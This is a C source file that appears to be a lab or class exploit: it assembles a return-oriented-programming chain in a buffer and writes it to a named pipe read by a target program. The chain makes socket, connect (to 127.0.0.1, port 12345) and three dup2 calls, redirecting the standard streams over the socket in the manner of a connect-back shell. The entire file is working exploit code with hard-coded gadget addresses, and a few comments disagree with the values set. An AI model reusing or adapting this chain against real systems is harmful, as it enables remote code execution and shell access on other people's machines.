#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  char bufr[700]; // address = 0xbfbf671d
  char trap[] = "\xe5\xb6\xa9\xbb";

  char pop_eax[] = "\xe1\xa0\xb9\xbb";
  char pop_edx[] = "\x1b\xdc\xb9\xbb";
  char pop_ecx[] = "\x22\xa4\xba\xbb";

  char xor_eax[] = "\xc2\xb3\xa9\xbb"; 
  char xor_edx[] = "\xd4\xbe\xb3\xbb";

  char and_eax_edx[] = "\x8a\xe9\xb3\xbb";

  char add_dl_al[] = "\x07\x46\xbb\xbb";
  char add_cl_ah[] = "\xd7\xbd\xa7\xbb";
  
  char inc_edx[] = "\x8a\xb8\xb7\xbb";

  char dec_ecx[] = "\x17\xe7\xb7\xbb";

  char write_at_ecx_from_edx[] = "\x7e\xb8\xb6\xbb";
  char write_at_edx_from_eax[] = "\x79\x2d\xb5\xbb";

  char jump_8[] = "\xe2\xd3\xb2\xbb";
  char jump_12[] = "\x68\x8b\xaa\xbb";
  char jump_16[] = "\x2a\x01\xad\xbb";

  char dummy_ret[] = "\x9c\x36\xa7\xbb";

  // _socket30 syscall
  char socket_arg1[] = "\x8a\x01\x01\x01";
  char socket_arg2[] = "\x01\x01\x01\x01";

  char socket_stack_arg1_address[] = "\x04\x68\xbf\xbf"; // -> 2, bufr + 231
  char socket_stack_arg2_address[] = "\x08\x68\xbf\xbf"; // -> 1, bufr + 235
  char socket_stack_arg3_address[] = "\x0c\x68\xbf\xbf"; // -> 0, bufr + 239

  // storing fd
  char con_fd_addr[] = "\xa8\x68\xbf\xbf"; // bufr + 395, 0xbfbf6898
  char dup_fd_addr1[] = "\x04\x69\xbf\xbf"; // bufr + 487, 0xbfbf6904
  char dup_fd_addr2[] = "\x24\x69\xbf\xbf"; // bufr + 519, 0xbfbf6924
  char dup_fd_addr3[] = "\x44\x69\xbf\xbf"; // bufr + 551, 0xbfbf6944

  // connect syscall 0xbfbf671d
  char con_arg[] = "\x62\x01\x01\x01";
  
  char con_arg_ip[] = "\x7f\x01\x01\x01";
  char con_arg_ip_mask[] = "\xff\xf0\xf0\xff";
  char con_arg_ip_addr[] = "\x5c\x68\xbf\xbf"; // bufr + 319, bfbf685c

  // info.filler = "\x01"
  // info.af_inent = "\x02"
  // info.port_num = "\x39\x30"
  // info.ip_addr = "\x01\x01\x01\x01" filler value, should be 0x0100007f before syscall
  // info.filler2 = "\x01\x01\x01\x01\x01\x01\x01\x01"

  char sockaddr_in[] = "\x01\x02\x30\x39\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01";
  char sockaddr_in_addr[] = "\x58\x68\xbf\xbf"; // bufr + 315, bfbf6858

  char con_arg_16_seed[] = "\x10\x11\x11\x11";
  char con_arg_16_addr[] = "\xb0\x68\xbf\xbf"; // bufr + 403, bfbf68a4

  // dup2 syscalls 0xbfbf671d
  char dup_arg_seed[] = "\x5A\x01\x01\x01";
  // #1 
  char dup_call_arg_addr[] = "\x08\x69\xbf\xbf"; // bufr + 491, bfbf68fc
  // #2
  char dup_call2_arg_addr[] = "\x28\x69\xbf\xbf"; // bufr + 523, bfbf691c
  // #3
  char dup_call3_arg_addr[] = "\x48\x69\xbf\xbf"; // bufr + 547, bfbf693c

  int i;
  // Fill up buffer
  for(i = 0; i < 131; i++)
    memcpy(bufr + i, "\x01",1);
  //----------------------------------------------------------------------------------------- _socket30
  // get first 8 bits of socket arg-> 8a
  strcpy(bufr + 131, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 135, socket_arg1);
  // get next 8 bits of socket arg-> 01
  strcpy(bufr + 139, pop_ecx); // 0xbbaa422
  strcpy(bufr + 143, socket_arg2);
  // clear eax
  strcpy(bufr + 147, xor_eax); // 0xbba9b3c2
  // add first 8 bits of arg
  strcpy(bufr + 151, add_dl_al); // 0xbbbb4607
  // add next 8 bits of arg
  strcpy(bufr + 155, add_cl_ah); // 0xbba7bdd7
                                 // eax now holds 394-> 18a
  // prepare stack with 3 args for socket syscall
  // clear edx
  strcpy(bufr + 159, xor_edx); // 0xbbb3bed4
  // increment ecx to 2
  strcpy(bufr + 163, inc_edx); // 0xbbb7b88a
  strcpy(bufr + 167, inc_edx); // 0xbbb7b88a
  // pop first address of args -> 2
  strcpy(bufr + 171, pop_ecx); // 0xbbaa422 dec_ecx
  strcpy(bufr + 175, socket_stack_arg1_address); // -> 0xbfbf6804
  // dummy gadget to avoid null character in address
  strcpy(bufr + 179, dummy_ret);
  strcpy(bufr + 183, write_at_ecx_from_edx); // 0xbbb6b87e
  // clear edx
  strcpy(bufr + 187, xor_edx); // 0xbbb3bed4
  // increment edx to 1
  strcpy(bufr + 191, inc_edx); // 0xbbb7b88a
  // pop second address of args -> 1
  strcpy(bufr + 195, pop_ecx); // 0xbbaa422
  strcpy(bufr + 199, socket_stack_arg2_address); // -> 0xbfbf6808
  strcpy(bufr + 203, write_at_ecx_from_edx); // 0xbbb6b87e
  // clear edx
  strcpy(bufr + 207, xor_edx); // 0xbbb3bed4
  // pop third address of args -> 0
  strcpy(bufr + 211, pop_ecx); // 0xbbaa422
  strcpy(bufr + 215, socket_stack_arg3_address); // -> 0xbfbf680c
  strcpy(bufr + 219, write_at_ecx_from_edx); // 0xbbb6b87e

  // trap into the kernel for _socket30 syscall
  strcpy(bufr + 223, trap);  // 0xbba9b6e5, location is 0xbfbf67fc
  // jump 12 bytes to next gadget
  strcpy(bufr + 227, jump_12); // 0xbbaa8b68
  // socket arg 1 -> 2
  strcpy(bufr + 231, "\x01\x01\x01\x01");
  // socket arg 2 -> 1
  strcpy(bufr + 235, "\x01\x01\x01\x01");
  // socket arg 3 -> 0
  strcpy(bufr + 239, "\x01\x01\x01\x01");
  // ------------------------------------------------------------------------------- store fd in stack
  // pop all the address into edx one by one, then write fd to the locations
  strcpy(bufr + 243, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 247, con_fd_addr); // 0xbbb52d79, location is 0xbfbf6898
  strcpy(bufr + 251, write_at_edx_from_eax);
  strcpy(bufr + 255, pop_edx); // pop_edx
  strcpy(bufr + 259, dup_fd_addr1); // dup_fd_addr1
  strcpy(bufr + 263, write_at_edx_from_eax); // write_at_edx_from_eax
  strcpy(bufr + 267, pop_edx); // pop_edx
  strcpy(bufr + 271, dup_fd_addr2); // dup_fd_addr2
  strcpy(bufr + 275, write_at_edx_from_eax); // write_at_edx_from_eax
  strcpy(bufr + 279, pop_edx); // pop_edx
  strcpy(bufr + 283, dup_fd_addr3); // dup_fd_addr3
  strcpy(bufr + 287, write_at_edx_from_eax); // write_at_edx_from_eax
  //----------------------------------------------------------------------------------------- connect
  // pop ip_address without null chars into edx
  strcpy(bufr + 291, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 295, con_arg_ip);
  // pop mask into eax
  strcpy(bufr + 299, pop_eax); // 0xbbb9a0e1
  strcpy(bufr + 303, con_arg_ip_mask); 
  // AND ecx and eax to get ip address
  strcpy(bufr + 307, and_eax_edx); // 0xbbb3e98a
                                  // eax should have 0x0100007f
  // store socket struct and jump over it
  strcpy(bufr + 311, jump_16); // 0xbbad012a
  strcpy(bufr + 315, sockaddr_in);
  // pop ip address addr into edx
  strcpy(bufr + 331, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 335, con_arg_ip_addr);
  // write eax to where edx points
  strcpy(bufr + 339, write_at_edx_from_eax); // 0xbbb52d79
                                            // 0xbfbf6828 should store 0x0100007f, sockaddr_in struct finished
  // use seed to put 0x10 into eax
  // pop seed into edx
  strcpy(bufr + 343, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 347, con_arg_16_seed);
  // clear eax
  strcpy(bufr + 351, xor_eax); // 0xbba9b3c2
  // add last 8 bits of edx to 
  strcpy(bufr + 355, add_dl_al); // 0xbbbb4607
  // pop 16 arg address into edx
  strcpy(bufr + 359, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 363, con_arg_16_addr);
  // write eax to where edx is pointing
  strcpy(bufr + 367, write_at_edx_from_eax); // 0xbbb52d79
                                            // 0x should have 0xf0
  // move 98 into eax                                            
  // clear eax
  strcpy(bufr + 371, xor_eax); // 0xbba9b3c2
  // pop connect arg into edx
  strcpy(bufr + 375, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 379, con_arg);
  // add first 8 bits of edx to eax
  strcpy(bufr + 383, add_dl_al); // 0xbbbb4607
                                // eax should have 0x62
  // trap into connect syscall
  strcpy(bufr + 387, trap);  // 0xbba9b6e5, location is 0xbfbf6894
  // jump 12 bytes
  strcpy(bufr + 391, jump_12);
  // file descriptor from _socket30
  strcpy(bufr + 395, "\x01\x01\x01\x01");
  // store address of socketaddr_in struct
  strcpy(bufr + 399, sockaddr_in_addr);
  // 4 byte value 16
  strcpy(bufr + 403, "\x01\x01\x01\x01");
  //----------------------------------------------------------------------------------------------- dup2
  // put 90 into eax
  // clear eax
  strcpy(bufr + 407, xor_eax); // 0xbba9b3c2
  // put seed into edx
  strcpy(bufr + 411, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 415, dup_arg_seed);
  // add first 8 bits to eax
  strcpy(bufr + 419, add_dl_al); // 0xbbbb4607
                                // eax should hold 98, 0x62
  // put proper args into all stack args
  // get null into edx
  strcpy(bufr + 423, xor_edx); // 0xbbb3bed4, edx has 0
  // pop off first arg address into ecx
  strcpy(bufr + 427, pop_ecx);  // 0xbbaa422
  strcpy(bufr + 431, dup_call_arg_addr); // -> 0xbfbf68f8
  strcpy(bufr + 435, write_at_ecx_from_edx); // 0xbbb6b87e
  // pop off second arg address into ecx
  strcpy(bufr + 439, inc_edx); // 0xbbb7b88a, edx has 1
  strcpy(bufr + 443, pop_ecx); // 0xbbaa422
  strcpy(bufr + 447, dup_call2_arg_addr); // -> 0xbfbf6c28
  strcpy(bufr + 451, write_at_ecx_from_edx); // 0xbbb6b87e
  // pop off third arg address into ecx
  strcpy(bufr + 455, inc_edx); //  0xbbb7b88a, edx has 2
  strcpy(bufr + 459, pop_ecx); // 0xbbaa422
  strcpy(bufr + 463, dup_call3_arg_addr);
  strcpy(bufr + 467, write_at_ecx_from_edx); // 0xbbb6b87e
                                            // all 3 dup2 calls should have proper num args
  // 2 dummy calls to avoid null chars
  strcpy(bufr + 471, dummy_ret);
  strcpy(bufr + 475, dummy_ret);
  // x/24x 0xbfbf6908
  // ---------------------------------------------------------- call #1
  strcpy(bufr + 479, trap); // 0xbba9b6e5, location is 0xbfbf6908
  strcpy(bufr + 483, jump_8); // 0xbbb2d3e2
  // 4 byte value  fd
  strcpy(bufr + 487, "\x01\x01\x01\x01");
  // 4 byte value 0
  strcpy(bufr + 491, "\x01\x01\x01\x01");
  // ---------------------------------------------------------- call #2
  strcpy(bufr + 495, xor_eax); // 0xbba9b3c2
  // put seed into edx
  strcpy(bufr + 499, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 503, dup_arg_seed);
  // add first 8 bits to eax
  strcpy(bufr + 507, add_dl_al); // 0xbbbb4607
                                // eax should hold 98, 0x62
  strcpy(bufr + 511, trap); // 0xbba9b6e5, location is 0xbfbf6928
  strcpy(bufr + 515, jump_8); // 0xbbb2d3e2
  // 4 byte value fd
  strcpy(bufr + 519, "\x01\x01\x01\x01");
  // 4 byte value 1
  strcpy(bufr + 523, "\x01\x01\x01\x01");
  // ---------------------------------------------------------- call #3
  strcpy(bufr + 527, xor_eax); // 0xbba9b3c2
  // put seed into edx
  strcpy(bufr + 531, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 535, dup_arg_seed);
  // add first 8 bits to eax
  strcpy(bufr + 539, add_dl_al); // 0xbbbb4607
                                // eax should hold 98, 0x62
  strcpy(bufr + 543, trap); // 0xbba9b6e5, location is 0xbfbf6948
  strcpy(bufr + 547, jump_8); // 0xbbb2d3e2
  // 4 byte value fd
  strcpy(bufr + 551, "\x01\x01\x01\x01");
  // 4 byte value 2
  strcpy(bufr + 555, "\x01\x01\x01\x01");
  writecmd(PIPEPATH, bufr);
  
  return 0;
}
